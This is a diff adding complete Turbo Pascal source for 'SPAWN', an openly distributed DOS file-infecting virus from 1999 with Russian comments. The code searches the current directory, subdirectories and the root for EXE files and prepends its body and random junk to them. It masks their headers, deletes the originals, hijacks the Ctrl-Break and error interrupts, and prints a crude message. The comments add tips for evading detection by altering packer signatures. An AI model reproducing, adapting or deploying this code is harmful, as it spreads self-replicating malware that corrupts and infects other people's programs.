@@ -1,0 +1,270 @@
+{ **********************************************************************}
+{  █▀▀▀ █▀▀█ █▀▀█ █   █ █   █     Специально для "TheCreatures"         }
+{  █▄▄▄ █▄▄█ █▄▄█ █   █ █▀▄ █   - The Virus ver 2.3   by ThePretender   }
+{     █ █    █  █ █ █ █ █  ▀█     HLLP-type; for free USE only          }
+{  ▄▄▄█ █    █  █  █ █  █   █   (cl) Copyleft - ThePretender            }
+{ **********************************************************************}
+{$M $4000,0,$8000}
+{$I-}
+{$D-}             { Забойные команды компилятору                 }
+{$L-}
+{$O-}
+{$R-}
+{$S-}             {             (компилятор забился...)          }
+{$F+}
+program virus_final_ver1_3;
+uses dos;
+const
+virlength=5230; { Длина _упакованного_ вира. Перед упаковкой LZEXE были забиты
+                  нулями слова "Runtime error at" и "Borland ....." до символа
+                  (тройка оставалась) Также советую поменять в коде
+                  'LZ91' на какую-нибудь хрень, и 06 0E 1F на 0E 1F 06
+                  (первая тройка байт кода unlzexe)                          }
+sign : array[1..2] of byte = (0,0); { <--слово 0000 - сигнатура (можно другое)}
+type
+filename = string[12];
+{ ------------------------------- Глобальные переменные: ------------------- }
+VAR
+diskinfo: string;
+victim: pathstr;
+dir: filename;              { <-- string[12]   }
+i: integer;
+infected: boolean;
+fil,fil2:file;
+nr,nw,MZ:word;
+buff: array[1..2048] of char;
+start:string[79];
+mylen :byte; {  Длина своего мусора                }
+
+
+p1,p2 : pointer;
+{============================================================================}
+
+procedure FindDirs(var dirs:string); { Процедура поиска каталогов }
+var
+d:searchrec;
+f:file;
+a:word;
+BEGIN
+dirs:='';
+findfirst('*.*',anyfile,d);
+while DosError = 0 do
+begin
+ assign(f,d.name);
+ a:=0;
+ getfattr(f,a);
+ if ((A and directory) <> 0) and (d.name<>'.') then
+ dirs := concat(dirs,d.name,';');
+ findnext(D);
+end;
+dirs:=dirs+chr(0);                 { <-- Маркировка конца списка директорий }
+END;
+
+procedure Infect (kogo : filename); { Процедура заражения конкретного файла }
+var
+victim:file;
+newfile:file;
+home:file;
+temp:word;
+b:array[1..virlength] of byte;
+NumRead, NumWritten: Word;
+bt,bt2,i : byte;
+
+BEGIN                          {         Алгоритм заражения:            }
+assign(victim,kogo);           { Возьмем жертву,                        }
+rename(victim,'temp0666.$$$'); { переименуем ее,                        }
+assign(newfile,kogo);          { а на ее место поставим заражаемый файл.}
+assign(home,paramstr(0));      { Найдем имя 'дрозофиллы'...             }
+rewrite(newfile,1);            { Откроем файл для записи,               }
+reset(home,1);                 { затем откроем дрозофиллу для чтения    }
+blockread (home,b,virlength);   { Прочитаем тело вируса,                }
+blockwrite(newfile,b,virlength);{   скопируем его в новый файл          }
+close(home);                    { Закроем дрозофиллу..                  }
+randomize; { не путать с ДРОЗДОФИЛИЗМОМ - сексуальным расстройством }
+bt:=random(100)+10;             { <-- кол. мусора }
+blockwrite(newfile,bt,1);
+for i:=1 to bt do begin         { припишем этого мусора                 }
+bt2:=random(250)+1;
+blockwrite(newfile,bt2,1);
+end;
+reset(victim,1);                { теперь откроем жертву.                }
+seek(victim,2);                 { маскировка 'MZ' жертвы                }
+repeat                          { А эту процедуру я нагло сдул из хелпа }
+  BlockRead(victim,b,         { к TP6 (на blockread)                  }
+            SizeOf(b),NumRead);
+  BlockWrite(newfile,b,NumRead,NumWritten);
+until (NumRead = 0) or
+      (NumWritten <> NumRead);
+                                { файл заражен! Подтираем за собой...   }
+erase(victim);                  { Жертву удаляем на хрен                }
+close(victim);close(newfile);   { (она теперь в созданном файле)        }
+END;                            { А это КОНЕЦ -> oOo                    }
+
+procedure FindFile;             { Поиск и заражение файла в текущем каталоге }
+var
+  kto: SearchRec;
+  vic: file of byte;
+   tb: array[1..4] of byte;
+label eshe;
+BEGIN
+  FindFirst('*.exe', Archive, kto);
+  while DosError = 0 do
+  begin
+    if infected=true then exit;
+    assign(vic,kto.name);
+    reset(vic);
+    if ioresult<>0 then goto eshe;
+    if filesize(vic)<1024 then goto eshe;
+    if filesize(vic)>65535 then goto eshe;
+    read (vic,tb[1]);
+    read (vic,tb[2]);
+    read (vic,tb[3]);
+    read (vic,tb[4]);
+
+if (tb[1]<>$4D) or (tb[2]<>$5A) then goto eshe;
+
+    if (tb[3]<>sign[1]) and (tb[4]<>sign[2]) then
+     begin
+      infect(kto.name); {+++++++++++++++++++++++++++++++++ЗАРАЖАЕМ!!!+++++++}
+      infected:=true;
+     end;
+eshe:
+    close(vic);
+    FindNext(kto);
+  end;
+END;
+label execprog,next;
+procedure antiBRAKE; interrupt;
+begin
+writeln('Ты что же, гадина, Ctrl-Break давишь, а ?!!',chr(7));
+end;
+
+procedure antiERROR; interrupt;
+var
+tempor : registers;
+begin
+writeln(' !!! uNkN0wN ERr0R !!! ',chr(7));
+intr($19,tempor);
+end;
+
+{    *** *** *** *** *** ***      Основной модуль:       *** *** *** ***}
+
+BEGIN
+getintvec($23,p1);                 { Это очень прикольно !      }
+setintvec($23,addr(antiBRAKE));
+getintvec($24,p2);                 { меняем вектора             }
+setintvec($24,addr(antiERROR));
+
+assign(fil,'temp0666.$$$');erase(fil); { <-- это чтоб работало... :)         }
+
+assign(fil,paramstr(0));reset(fil,1);
+seek(fil,virlength); blockread(fil,mylen,1);{ Прочитаем длину нашего мусора  }
+close(fil);
+infected:=false;
+victim:='';
+getdir(0,start);
+dir:=paramstr(0);
+if dir[1]='A' then chdir('C:');    { При старте с флопа переберемся на винт }
+findfile;                                       { Поищем файла под жопой... }
+if infected=true then goto execprog;
+finddirs(diskinfo);                             { in SUB-DIRs               }
+if diskinfo=chr(0) then goto next;              { Если SUB-DIRs нет то и    }
+{-------------------------------}               { на нет и ссуды не дают... }
+ i:=1;
+repeat
+ dir:='';
+ repeat
+  dir:=dir+diskinfo[i];                         { dir - директория,         }
+  i:=i+1;
+ until diskinfo[i]=';';                         { выковыренная из diskinfo   }
+chdir(dir);                                     { Сменим ее                  }
+findfile;                                       { И поищем, чего бы заразить }
+if infected=true then goto execprog;
+chdir(start);
+i:=i+1;
+until diskinfo[i]=#0;
+{-------------------------------}
+next:
+
+chdir ('\');                                   { идем в корневой каталог    }
+findfile;
+
+if infected=true then goto execprog;
+finddirs(diskinfo);
+if diskinfo=chr(0) then goto execprog;
+{-------------------------------}
+i:=1;
+repeat
+ dir:='';
+ repeat
+  dir:=dir+diskinfo[i];
+  i:=i+1;
+ until diskinfo[i]=';';
+chdir(dir);
+findfile;
+if infected=true then goto execprog;
+chdir('\');
+i:=i+1;
+until diskinfo[i]=chr(0);
+{-------------------------------}
+{    --==++==--           Теперь займемся исполнением кода носителя:        }
+execprog:
+
+                                  { Перейдем в стартовый каталог            }
+chdir(start);
+if infected=false then begin
+
+{                  вопрос, мучующий всех юзер0в:                      }
+
+{         !!! П Р О Я В Л Е Н И Е !!!      вира                       }
+
+writeln;
+
+writeln ('****************************** Copyleft (cl) ');
+writeln ('  SPAWN - the virus ver 1.3 by ThePretender  ');
+writeln ('                                             ');
+writeln (' I like              ...dont fuck me hard,  ');
+writeln ('   fucking,    /~V~\      mr DANILOFF !!!    ');
+writeln ('   BUT...      `| | `                        ');
+writeln ('                " "           see ya!        ');
+writeln ('** March 1999 *******************************');
+
+halt(8);end;
+
+assign(fil,paramstr(0));
+reset(fil,1);
+if filesize(fil)<virlength+1000 then begin
+  writeln('SPAWN launched');
+  halt(0);
+end;
+rename(fil,'temp0666.$$$');
+assign(fil2,paramstr(0));
+rewrite(fil2,1);
+mz:=$5A4D;
+seek(fil,virlength+mylen+1);    { Найдем начало носителя                  }
+blockwrite(fil2,mz,2);          { Восстановим 'MZ'                        }
+repeat                          { Копируем тело носителя в отдельный файл }
+  BlockRead(fil,buff,
+            SizeOf(buff),NR);
+  BlockWrite(fil2,buff,NR,NW);
+until (NR = 0) or
+      (NW <> NR);
+close(fil);
+close(fil2);                    { Теперь пусть носитель пыжится ,         }
+swapvectors;                    { мы свое отпыжились...                   }
+exec(paramstr(0),paramstr(1)+' '+paramstr(2)+' '+paramstr(3)+' '+paramstr(4));
+swapvectors;
+if DosError <> 0 then writeln('Not enought memory');
+chdir(start);
+assign(fil,paramstr(0));
+erase(fil);
+assign(fil,'temp0666.$$$');
+rename(fil,paramstr(0));
+close (fil);
+
+setintvec($23,p1);                 { Возвращаем вектора }
+setintvec($24,p2);
+{$I+}
+END.
+
+{ Вот тебе, бабушка, и rocket jump... }
